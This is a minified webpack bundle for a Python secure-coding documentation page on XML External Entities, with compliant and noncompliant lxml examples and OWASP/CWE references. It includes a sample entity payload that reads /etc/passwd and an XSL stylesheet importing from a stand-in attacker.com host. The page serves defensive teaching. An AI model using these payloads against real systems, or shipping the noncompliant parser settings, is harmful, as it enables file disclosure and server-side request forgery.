(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{100:function(e,t,n){"use strict";n.r(t),n.d(t,"frontMatter",(function(){return l})),n.d(t,"metadata",(function(){return o})),n.d(t,"rightToc",(function(){return c})),n.d(t,"default",(function(){return p}));var r=n(2),a=n(6),s=(n(0),n(108)),l={title:"XML External Entities (XXE)",sidebar_label:"XML External Entities (XXE)"},o={unversionedId:"security_awareness/languages/Python/XXE",id:"security_awareness/languages/Python/XXE",isDocsHomePage:!1,title:"XML External Entities (XXE)",description:"Description",source:"@site/docs/security_awareness/languages/Python/XXE.md",slug:"/security_awareness/languages/Python/XXE",permalink:"/docs/security_awareness/languages/Python/XXE",version:"current",sidebar_label:"XML External Entities (XXE)",sidebar:"someSidebar",previous:{title:"Weak Encryption",permalink:"/docs/security_awareness/languages/Python/WeakEncryption"}},c=[{value:"Description",id:"description",children:[]},{value:"Vulnerable Code Example",id:"vulnerable-code-example",children:[]},{value:"Mitigation",id:"mitigation",children:[]},{value:"Risk Assessment",id:"risk-assessment",children:[]},{value:"References",id:"references",children:[]}],i={rightToc:c};function p(e){var t=e.components,n=Object(a.a)(e,["components"]);return Object(s.b)("wrapper",Object(r.a)({},i,n,{components:t,mdxType:"MDXLayout"}),Object(s.b)("h2",{id:"description"},"Description"),Object(s.b)("p",null,"XML specification allows the use of entities that can be internal or external (file system / network access ...) which could lead to vulnerabilities such as confidential file disclosures or SSRFs."),Object(s.b)("p",null,"Example in this XML document, an external entity read the /etc/passwd file:"),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),'<?xml version="1.0" encoding="utf-8"?>\n  <!DOCTYPE test [\n    <!ENTITY xxe SYSTEM "file:///etc/passwd">\n  ]>\n<note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">\n  <to>&xxe;</to>\n  <from>Jani</from>\n  <heading>Reminder</heading>\n  <body>Don\'t forget me this weekend!</body>\n</note>\n')),Object(s.b)("p",null,"In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:"),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),'<?xml version="1.0" encoding="UTF-8"?>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl">\n  <xsl:import href="http://www.attacker.com/evil.xsl"/>\n  <xsl:include href="http://www.attacker.com/evil.xsl"/>\n <xsl:template match="/">\n  &content;\n </xsl:template>\n</xsl:stylesheet>\n')),Object(s.b)("p",null,"It is recommended to disable access to external entities and network access in general."),Object(s.b)("h2",{id:"vulnerable-code-example"},"Vulnerable Code Example"),Object(s.b)("p",null,"lxml module:"),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},"When parsing XML:")),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),"parser = etree.XMLParser() # Noncompliant: by default resolve_entities is set to true\ntree1 = etree.parse('ressources/xxe.xml', parser)\nroot1 = tree1.getroot()\n\nparser = etree.XMLParser(resolve_entities=True) # Noncompliant\ntree1 = etree.parse('ressources/xxe.xml', parser)\nroot1 = tree1.getroot()\n")),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},"When validating XML:")),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),"parser = etree.XMLParser(resolve_entities=True) # Noncompliant\ntreexsd = etree.parse('ressources/xxe.xsd', parser)\nrootxsd = treexsd.getroot()\nschema = etree.XMLSchema(rootxsd)\n")),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},"When transforming XML:")),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),"ac = etree.XSLTAccessControl(read_network=True, write_network=False)  # Noncompliant, read_network is set to true/network access is authorized\ntransform = etree.XSLT(rootxsl, access_control=ac)\n")),Object(s.b)("h2",{id:"mitigation"},"Mitigation"),Object(s.b)("p",null,"lxml module:"),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},"When parsing XML, disable resolveentities_ and network access:")),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),"parser = etree.XMLParser(resolve_entities=False, no_network=True) # Compliant\ntree1 = etree.parse('ressources/xxe.xml', parser)\nroot1 = tree1.getroot()\n")),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},"When validating XML (note that network access cannot be completely disabled when calling XMLSchema):")),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),"parser = etree.XMLParser(resolve_entities=False) # Compliant: by default no_network is set to true\ntreexsd = etree.parse('ressources/xxe.xsd', parser)\nrootxsd = treexsd.getroot()\nschema = etree.XMLSchema(rootxsd) # Compliant\n")),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},"When transforming XML, disable access to network and file system:")),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),"parser = etree.XMLParser(resolve_entities=False) # Compliant\ntreexsl = etree.parse('ressources/xxe.xsl', parser)\nrootxsl = treexsl.getroot()\n\nac = etree.XSLTAccessControl.DENY_ALL  # Compliant\ntransform = etree.XSLT(rootxsl, access_control=ac) # Compliant\n")),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},"To prevent xxe attacks with xml.sax module (for other security reasons than XXE, xml.sax is not recommended):")),Object(s.b)("pre",null,Object(s.b)("code",Object(r.a)({parentName:"pre"},{className:"language-python"}),'parser = xml.sax.make_parser()\nmyHandler = MyHandler()\nparser.setContentHandler(myHandler)\nparser.parse("ressources/xxe.xml") # Compliant: in version 3.7.1: The SAX parser no longer processes general external entities by default\n\nparser.setFeature(feature_external_ges, False) # Compliant\nparser.parse("ressources/xxe.xml")\n')),Object(s.b)("h2",{id:"risk-assessment"},"Risk Assessment"),Object(s.b)("h2",{id:"references"},"References"),Object(s.b)("ul",null,Object(s.b)("li",{parentName:"ul"},Object(s.b)("a",Object(r.a)({parentName:"li"},{href:"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html"}),"A4:2017-XML External Entities (XXE)")),Object(s.b)("li",{parentName:"ul"},Object(s.b)("a",Object(r.a)({parentName:"li"},{href:"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"}),"XML External Entity Prevention Cheat Sheet")),Object(s.b)("li",{parentName:"ul"},Object(s.b)("a",Object(r.a)({parentName:"li"},{href:"https://cwe.mitre.org/data/definitions/611.html"}),"CWE-611: Improper Restriction of XML External Entity Reference")),Object(s.b)("li",{parentName:"ul"},Object(s.b)("a",Object(r.a)({parentName:"li"},{href:"https://cwe.mitre.org/data/definitions/827.html"}),"CWE-827: Improper Control of Document Type Definition"))))}p.isMDXComponent=!0},108:function(e,t,n){"use strict";n.d(t,"a",(function(){return u})),n.d(t,"b",(function(){return d}));var r=n(0),a=n.n(r);function s(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){s(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var i=a.a.createContext({}),p=function(e){var t=a.a.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},u=function(e){var t=p(e.components);return a.a.createElement(i.Provider,{value:t},e.children)},b={inlineCode:"code",wrapper:function(e){var t=e.children;return a.a.createElement(a.a.Fragment,{},t)}},m=a.a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,s=e.originalType,l=e.parentName,i=c(e,["components","mdxType","originalType","parentName"]),u=p(n),m=r,d=u["".concat(l,".").concat(m)]||u[m]||b[m]||s;return n?a.a.createElement(d,o(o({ref:t},i),{},{components:n})):a.a.createElement(d,o({ref:t},i))}));function d(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var s=n.length,l=new Array(s);l[0]=m;var o={};for(var c in t)hasOwnProperty.call(t,c)&&(o[c]=t[c]);o.originalType=e,o.mdxType="string"==typeof e?e:r,l[1]=o;for(var i=2;i<s;i++)l[i]=n[i];return a.a.createElement.apply(null,l)}return a.a.createElement.apply(null,n)}m.displayName="MDXCreateElement"}}]);